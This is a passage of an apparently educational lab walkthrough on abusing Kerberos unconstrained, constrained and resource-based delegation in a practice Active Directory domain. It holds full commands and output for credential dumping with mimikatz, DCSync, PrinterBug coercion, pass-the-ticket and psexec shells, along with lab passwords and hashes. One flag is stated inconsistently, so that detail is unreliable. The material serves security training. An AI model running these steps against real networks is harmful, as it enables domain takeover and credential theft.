RUZSRUlHSFQuTE9DQUyiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDIzMDQyNjIzMjQ0N1qmERgPMjAyMzA0MjcwOTI0NDdapxEYDzIwMjMwNTAzMjMyNDQ3WqgVGxNJTkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM /ptt
```

```
PS C:\Tools> .\Rubeus.exe renew /ticket:doIF3jCCBdqgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORU<SNIP> /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Renew Ticket

[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\DC01$'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      doIF3jCCBdqgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
<SNIP>
[+] Ticket successfully imported!
```

After importing the TGT of `DC01$`, students need to perform the `DCSync` attack to retrieve the `Administrator` `NTLM` hash from the domain controller, finding it to be `a83b750679b1789e29e966d06c7e41f7`:

Code: powershell

```powershell
.\mimikatz.exe privilege::debug "lsadump::dcsync /domain:inlanefreight.local /user:administrator" exit
```

```
PS C:\Tools> .\mimikatz.exe privilege::debug "lsadump::dcsync /domain:inlanefreight.local /user:administrator" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::dcsync /domain:inlanefreight.local /user:administrator
[DC] 'inlanefreight.local' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/19/2022 3:42:15 AM
Object Security ID   : S-1-5-21-1870146311-1183348186-593267556-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: a83b750679b1789e29e966d06c7e41f7

<SNIP>

mimikatz(commandline) # exit
Bye!
```

Using the password hash of `Administrator`, students need to request a new ticket for `Administrator` with `Rubeus`'s [asktgt action](https://github.com/GhostPack/Rubeus#asktgt) and and utilize the `/ptt` option to pass the received ticket into memory so that it can be used for future requests:

Code: powershell

```powershell
.\Rubeus.exe asktgt /rc4:a83b750679b1789e29e966d06c7e41f7 /user:Administrator /ptt
```

```
PS C:\Tools> .\Rubeus.exe asktgt /rc4:a83b750679b1789e29e966d06c7e41f7 /user:Administrator /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: a83b750679b1789e29e966d06c7e41f7
[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\Administrator'
[*] Using domain controller: 172.16.99.3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

  doIGFjCCBhKgAwIBBaEDAgEWooIFETCCBQ1hggUJMIIFBaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
<SNIP>
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
  ServiceRealm             :  INLANEFREIGHT.LOCAL
  UserName                 :  Administrator
  UserRealm                :  INLANEFREIGHT.LOCAL
  StartTime                :  4/26/2023 6:43:54 PM
  EndTime                  :  4/27/2023 4:43:54 AM
  RenewTill                :  5/3/2023 6:43:54 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  Z3PqJN+9BGAdcnCsp86uEA==
  ASREP (key)              :  A83B750679B1789E29E966D06C7E41F7
```

At last, when reading the contents of the file `\\dc01\C$\Unconstrained\flag.txt`, students will attain the flag `ABUSING_Th3_Pr1nT3r_BuG`:

Code: powershell

```powershell
more '\\DC01\C$\Unconstrained\flag.txt'
```

```
PS C:\Tools> more '\\dc01\C$\Unconstrained\flag.txt'

ABUSING_Th3_Pr1nT3r_BuG
```

Answer: `ABUSING_Th3_Pr1nT3r_BuG`

# Unconstrained Delegation - Users

## Question 1

### "callum.dixon:C@lluMDIXON has Unconstrained Delegation set and carole.rose:jasmine has genericwrite over callum.dixon. Using this information, try to compromise the domain and read the content of C:\\flag.txt on DC01."

After spawning the target machine, students first need to create an entry for it in `/etc/hosts` with the domain name `inlanefreight.local` and `dc01.inlanefreight.local`:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.local dc01.inlanefreight.local" >> /etc/hosts'
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~]
└──╼ $sudo sh -c 'echo "10.129.205.35 inlanefreight.local dc01.inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to clone [krbrelayx](https://github.com/dirkjanm/krbrelayx) and change directories to it:

Code: shell

```shell
git clone -q https://github.com/dirkjanm/krbrelayx.git; cd krbrelayx
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~]
└──╼ $git clone -q https://github.com/dirkjanm/krbrelayx.git; cd krbrelayx
```

Students then need to use `dnstool.py` to add a fake DNS record (named `mail.inlanefreight.local` here) that points to `PWNIP`, using the domain account `carole.rose:jasmine`:

Code: shell

```shell
python3 dnstool.py -u inlanefreight.local\\carole.rose -p jasmine -r mail.inlanefreight.local -d PWNIP --action add STMIP
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~/krbrelayx]
└──╼ $python3 dnstool.py -u inlanefreight.local\\carole.rose -p jasmine -r mail.inlanefreight.local -d 10.10.14.38 --action add 10.129.205.35

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

After waiting for a few minutes, students need to confirm if the DNS record has been created successfully using `nslookup`:

Code: shell

```shell
nslookup mail.inlanefreight.local STMIP
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~/krbrelayx]
└──╼ $nslookup mail.inlanefreight.local 10.129.205.35

Server:		10.129.205.35
Address:	10.129.205.35#53

Name:	mail.inlanefreight.local
Address: 10.10.14.38
```

Subsequently, students need to add a crafted SPN to the target account `callum.dixon` using `addspn.py`:

Code: shell

```shell
python3 addspn.py -u inlanefreight.local\\carole.rose -p jasmine --target-type samname -t callum.dixon -s CIFS/mail.inlanefreight.local STMIP
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~/krbrelayx]
└──╼ $python3 addspn.py -u inlanefreight.local\\carole.rose -p jasmine --target-type samname -t callum.dixon -s CIFS/mail.inlanefreight.local 10.129.205.35

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

Then, students need to attain the NTLM hash of `callum.dixon`'s password, `C@lluMDIXON`, finding it to be `3e7c48255206470a13543b27b7af18de`:

Code: shell

```shell
iconv -f ASCII -t UTF-16LE <(printf "C@lluMDIXON") | openssl dgst -md4
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~/krbrelayx]
└──╼ $iconv -f ASCII -t UTF-16LE <(printf "C@lluMDIXON") | openssl dgst -md4

(stdin)= 3e7c48255206470a13543b27b7af18de
```

Students then need to run `krbrelayx.py` and provide it the NTLM hash of `callum.dixon` to decrypt received TGS tickets (of `DC01` to be coerced into authenticating against `CIFS/mail.inlanefreight.local` subsequently):

Code: shell

```shell
sudo python3 krbrelayx.py -hashes :3e7c48255206470a13543b27b7af18de
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~/krbrelayx]
└──╼ $sudo python3 krbrelayx.py -hashes :3e7c48255206470a13543b27b7af18de

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
<SNIP>
```

Afterward, students need to leverage the `PrinterBug` utilizing [dementor.py](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc) or [printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), to coerce the domain controller to authenticate to `CIFS/mail.inlanefreight.local`; the latter will be used (inside a new terminal session inside the directory `krbrelayx/`):

Code: shell

```shell
python3 printerbug.py inlanefreight.local/carole.rose:jasmine@STMIP mail.inlanefreight.local
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~/krbrelayx]
└──╼ $python3 printerbug.py inlanefreight.local/carole.rose:jasmine@10.129.205.35 mail.inlanefreight.local

[*] Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Attempting to trigger authentication via rprn RPC at 10.129.205.35
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked
```

Checking `krbrelayx`, students will notice that the TGT embedded inside the TGS ticket of `DC01$` has been extracted to `DC01$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache`:

```
[*] SMBD: Received connection from 10.129.205.35
[*] Got ticket for DC01$@INLANEFREIGHT.LOCAL [krbtgt@INLANEFREIGHT.LOCAL]
[*] Saving ticket in DC01$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache
[*] SMBD: Received connection from 10.129.205.35
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.129.205.35
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
```

Thereafter, students need to set the `KRB5CCNAME` environment variable to the path of `DC01$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache`:

Code: shell

```shell
export KRB5CCNAME=./DC01\$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~/krbrelayx]
└──╼ $export KRB5CCNAME=./DC01\$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache
```

Students then need to utilize [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) to perform a `DCSync` attack against `dc01.inlanefreight.local`, finding the hash of `Administrator` to be `a83b750679b1789e29e966d06c7e41f7`:

Code: shell

```shell
secretsdump.py -k -no-pass dc01.inlanefreight.local
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~/krbrelayx]
└──╼ $secretsdump.py -k -no-pass dc01.inlanefreight.local

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a83b750679b1789e29e966d06c7e41f7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c0231bd8a4a4de92fca0760c0ba9e7a6:::
derek.walker:1105:aad3b435b51404eeaad3b435b51404ee:69cc8c83c56aeeb7571bbeec20c6ef65:::
```

Students need to use [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py) to connect to `STMIP` as `Administrator`, passing the hash `a83b750679b1789e29e966d06c7e41f7`:

Code: shell

```shell
psexec.py Administrator@\STMIP -hashes :a83b750679b1789e29e966d06c7e41f7
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~/krbrelayx]
└──╼ $psexec.py Administrator@\STMIP -hashes :a83b750679b1789e29e966d06c7e41f7

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Requesting shares on 10.129.205.35.....
[*] Found writable share ADMIN$
[*] Uploading file JgPnCAdA.exe
[*] Opening SVCManager on 10.129.205.35.....
[*] Creating service XdTz on 10.129.205.35.....
[*] Starting service XdTz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

At last, when reading the contents of the file `C:\flag.txt`, students will attain the flag `Abusing_U$3r_UnC0nstra1n3d_DeleG4t1on`:

Code: cmd

```cmd
more C:\flag.txt
```

```
C:\Windows\system32> more C:\flag.txt

Abusing_U$3r_UnC0nstra1n3d_DeleG4t1on
```

Answer: `Abusing_U$3r_UnC0nstra1n3d_DeleG4t1on`

# Constrained Delegation Overview & Attacking from Windows

## Question 1

### "Connect to the target machine via RDP on port 13389 to access DMZ01 and then repeat the steps shown previously. What is the content of C:\\Users\\Administrator.INLANEFREIGHT\\Desktop\\flag.txt?"

After spawning the target machine, students first need to connect to it with `xfreerdp` on port 13389 using the credentials `carole.holmes:Y3t4n0th3rP4ssw0rd`:

Code: shell

```shell
xfreerdp /u:carole.holmes /p:'Y3t4n0th3rP4ssw0rd' /v:STMIP:13389 /dynamic-resolution
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~]
└──╼ $xfreerdp /u:carole.holmes /p:'Y3t4n0th3rP4ssw0rd' /v:10.129.193.254:13389 /dynamic-resolution

[14:58:57:261] [3783:3784] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[14:58:57:261] [3783:3784] [WARN][com.freerdp.crypto] - CN = DMZ01.INLANEFREIGHT.LOCAL
[14:58:57:261] [3783:3784] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[14:58:57:261] [3783:3784] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[14:58:57:261] [3783:3784] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[14:58:57:261] [3783:3784] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.193.254:13389) 
[14:58:57:261] [3783:3784] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[14:58:57:261] [3783:3784] [ERROR][com.freerdp.crypto] - Common Name (CN):
[14:58:57:261] [3783:3784] [ERROR][com.freerdp.crypto] - 	DMZ01.INLANEFREIGHT.LOCAL
[14:58:57:261] [3783:3784] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.193.254:13389 (RDP-Server):
	Common Name: DMZ01.INLANEFREIGHT.LOCAL
	Subject:     CN = DMZ01.INLANEFREIGHT.LOCAL
	Issuer:      CN = DMZ01.INLANEFREIGHT.LOCAL
	Thumbprint:  ca:69:5a:5e:f1:b4:a4:28:3e:a2:af:30:5c:da:18:28:c2:d5:88:a2:ee:b8:b8:d1:b6:81:83:cd:97:18:3b:14
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, in a privileged PowerShell session, students need to navigate to `C:\Tools\`, set the execution policy to `Bypass`, import PowerView, and then use the `Get-DomainComputer` function with the `-TrustedToAuth` switch; students will find that the computer account `DMZ01` has constrained delegation on `www/WS01`:

Code: powershell

```powershell
Set-ExecutionPolicy Bypass -Force
Get-DomainComputer -TrustedToAuth
```

```
PS C:\Tools> Set-ExecutionPolicy Bypass -Force
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainComputer -TrustedToAuth

logoncount                    : 67
badpasswordtime               : 12/31/1600 6:00:00 PM
distinguishedname             : CN=DMZ01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 4/27/2023 8:59:22 AM
objectsid                     : S-1-5-21-1870146311-1183348186-593267556-1118
samaccountname                : DMZ01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : DMZ01
accountexpires                : NEVER
whenchanged                   : 4/27/2023 1:59:22 PM
instancetype                  : 4
usncreated                    : 12870
objectguid                    : eaebb114-2638-40ec-9617-8715c4d3057a
operatingsystem               : Windows Server 2019 Standard
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 6:00:00 PM
msds-allowedtodelegateto      : {www/WS01.INLANEFREIGHT.LOCAL, www/WS01}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {tapinego/DMZ01, tapinego/DMZ01.INLANEFREIGHT.LOCAL, WSMAN/DMZ01, WSMAN/DMZ01.INLANEFREIGHT.LOCAL...}
lastlogon                     : 4/27/2023 8:59:43 AM
iscriticalsystemobject        : False
usnchanged                    : 143416
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated                   : 10/14/2022 12:10:03 PM
primarygroupid                : 515
pwdlastset                    : 3/23/2023 10:20:32 AM
msds-supportedencryptiontypes : 28
name                          : DMZ01
dnshostname                   : DMZ01.INLANEFREIGHT.LOCAL
```

To carry out the attack, students first need to steal the NTLM hash of the `DMZ01$` machine account using `mimikatz`, to find it to be `81322a06e7a6d0f8764531bc8c52fa66`:

Code: powershell

```powershell
.\mimikatz.exe privilege::debug sekurlsa::msv exit
```

```
PS C:\Tools> .\mimikatz.exe privilege::debug sekurlsa::msv exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::msv

Authentication Id : 0 ; 323809 (00000000:0004f0e1)
Session           : RemoteInteractive from 2
User Name         : carole.holmes
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 4/27/2023 8:59:24 AM
SID               : S-1-5-21-1870146311-1183348186-593267556-1106
	msv :	
	 [00000003] Primary
	 * Username : carole.holmes
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 37ef72fcf42a4021948c7ed7b33ccf21
	 * SHA1     : 78c2ae990df6691d1b07249c1c261522bcc8a8a4
	 * DPAPI    : 25a764a34f8d9ea6128fea463abfefa1

Authentication Id : 0 ; 300022 (00000000:000493f6)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/27/2023 8:59:23 AM
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : DMZ01$
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 81322a06e7a6d0f8764531bc8c52fa66
	 * SHA1     : f9232403611aa86f51a05c64e1abd86ce4021ff1

<SNIP>
mimikatz(commandline) # exit
Bye!
```

Subsequently, students need to use the [s4u](https://github.com/GhostPack/Rubeus#s4u) action of `Rubeus` to impersonate `Administrator` and attain a TGS ticket for the `HTTP` service to use [PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.3):

Code: powershell

```powershell
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:81322a06e7a6d0f8764531bc8c52fa66 /ptt
```

```
PS C:\Tools> .\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:81322a06e7a6d0f8764531bc8c52fa66 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: S4U

[*] Using rc4_hmac hash: 81322a06e7a6d0f8764531bc8c52fa66
[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\DMZ01$'
[*] Using domain controller: 172.16.99.3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

  doIFqDCCBaSgAwIBBaEDAgEWooIEqjCCBKZhggSiMIIEnqADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
<SNIP>

[*] Action: S4U

[*] Building S4U2self request for: 'DMZ01$@INLANEFREIGHT.LOCAL'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Sending S4U2self request to 172.16.99.3:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'DMZ01$@INLANEFREIGHT.LOCAL'
[*] base64(ticket.kirbi):

doIGDDCCBgigAwIBBaEDAgEWooIFDDCCBQhhggUEMIIFAKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
<SNIP>

[*] Impersonating user 'Administrator' to target SPN 'www/WS01.inlanefreight.local'
[*]   Final ticket will be for the alternate service 'HTTP'
[*] Building S4U2proxy request for service: 'www/WS01.inlanefreight.local'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Sending S4U2proxy request to domain controller 172.16.99.3:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'HTTP'
[*] base64(ticket.kirbi) for SPN 'HTTP/WS01.inlanefreight.local':

doIG5DCCBuCgAwIBBaEDAgEWooIF3DCCBdhhggXUMIIF0KADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
<SNIP>
[+] Ticket successfully imported!
```

Students then need to connect to `ws01.inlanefreight.local`:

Code: powershell

```powershell
Enter-PSSession WS01.inlanefreight.local
```

```
PS C:\Tools> Enter-PSSession WS01.inlanefreight.local

[WS01.inlanefreight.local]: PS C:\Users\Administrator.INLANEFREIGHT\Documents>
```

At last, when reading the contents of the file `C:\Users\Administrator.INLANEFREIGHT\Desktop\flag.txt`, students will attain the flag `Abusing_U$3r_UnC0nstra1n3d_DeleG4t1on`:

Code: powershell

```powershell
more C:\Users\Administrator.INLANEFREIGHT\Desktop\flag.txt
```

```
[WS01.inlanefreight.local]: PS C:\Users\Administrator.INLANEFREIGHT\Documents> more C:\Users\Administrator.INLANEFREIGHT\Desktop\flag.txt

Constrained_D3L3g4t10N_Fr0M_W1n2
```

Answer: `Constrained_D3L3g4t10N_Fr0M_W1n2`

# Constrained Delegation from Linux

## Question 1

### "Repeat the steps and read the content of C:\\Users\\Administrator\\Desktop\\flag.txt."

After spawning the target machine, students first need to create an entry for it in `/etc/hosts` with the domain name `inlanefreight.local` and `DC01`:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.local DC01" >> /etc/hosts'
```

```
┌─[htb-ac-413848@htb-pofdwtjunw]─[~]
└──╼ $sudo sh -c 'echo "10.129.88.85 inlanefreight.local DC01" >> /etc/hosts'
```

Subsequently, students need to use `impacket`'s [findDelegation.py](https://github.com/fortra/impacket/blob/master/examples/findDelegation.py) to find the accounts with delegation privileges, utilizing the domain account `beth.richards:B3thR!ch@rd$`; students will notice that `beth.richards` has constrained delegation with protocol transition set, and the only allowed service for delegation is `TERMSRV/DC01.INLANEFREIGHT.LOCAL`:

Code: shell

```shell
findDelegation.py inlanefreight.local/beth.richards:'B3thR!ch@rd$'
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~]
└──╼ $findDelegation.py inlanefreight.local/beth.richards:'B3thR!ch@rd$'

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

AccountName    AccountType  DelegationType                      DelegationRightsTo               
-------------  -----------  ----------------------------------  --------------------------------
callum.dixon   Person       Unconstrained                       N/A                              
beth.richards  Person       Constrained w/ Protocol Transition  TERMSRV/DC01.INLANEFREIGHT.LOCAL 
beth.richards  Person       Constrained w/ Protocol Transition  TERMSRV/DC01                     
DMZ01$         Computer     Constrained w/ Protocol Transition  www/WS01.INLANEFREIGHT.LOCAL     
DMZ01$         Computer     Constrained w/ Protocol Transition  www/WS01                         
SQL01$         Computer     Unconstrained                       N/A 
```

Thereafter, students need to use [getST.py](https://github.com/fortra/impacket/blob/master/examples/getST.py) to craft a valid TGS for `Administrator` to access the service `TERMSRV` on the `DC01` host (in case students get the error message `[Errno 2] No such file or directory: './DC01$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache'`, they need to run the command `unset KRB5CCNAME`):

Code: shell

```shell
getST.py -spn TERMSRV/DC01 'inlanefreight.local/beth.richards:B3thR!ch@rd$' -impersonate Administrator
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~]
└──╼ $getST.py -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Subsequently, students need to import the ticket attained `Administrator.ccache` by setting its path to the environment variable `KRB5CCNAME`:

Code: shell

```shell
export KRB5CCNAME=./Administrator.ccache
```

```
┌─[htb-ac-413848@htb-leoujotdzs]─[~]
└──╼ $export KRB5CCNAME=./Administrator.ccache
```

Students then need to use [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py) to access the `TERMSRV` service on `DC01` as `Administrator`:

Code: shell

```shell
psexec.py -k -no-pass inlanefreight.local/administrator@DC01
```

```
┌─[htb-ac-413848@htb-8ch1kt5w6t]─[~]
└──╼ $psexec.py -k -no-pass inlanefreight.local/administrator@DC01

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Requesting shares on DC01.....
[*] Found writable share ADMIN$
[*] Uploading file DwVlwUnJ.exe
[*] Opening SVCManager on DC01.....
[*] Creating service uiEM on DC01.....
[*] Starting service uiEM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

At last, when reading the contents of the file `C:\Users\Administrator\Desktop\flag.txt`, students will attain the flag `Fl4g_C0nstrained_Delg`:

Code: cmd

```cmd
more C:\Users\Administrator\Desktop\flag.txt
```

```
C:\Windows\system32> more C:\Users\Administrator\Desktop\flag.txt

Fl4g_C0nstrained_Delg
```

Answer: `Fl4g_C0nstrained_Delg`

# RBCD Overview & Attacking from Windows

## Question 1

### "Search which machine carole.holmes:Y3t4n0th3rP4ssw0rd has rights over. What is the content of C:\\carole.holmes\\flag.txt on DC01?"

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:STMIP /dynamic-resolution
```

```
┌─[htb-ac-413848@htb-8ch1kt5w6t]─[~]
└──╼ $xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.205.26 /dynamic-resolution

[17:58:53:409] [5606:5607] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[17:58:53:409] [5606:5607] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[17:58:53:409] [5606:5607] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[17:58:53:430] [5606:5607] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[17:58:53:430] [5606:5607] [WARN][com.freerdp.crypto] - CN = WS01.INLANEFREIGHT.LOCAL
[17:58:53:430] [5606:5607] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[17:58:53:430] [5606:5607] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[17:58:53:430] [5606:5607] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
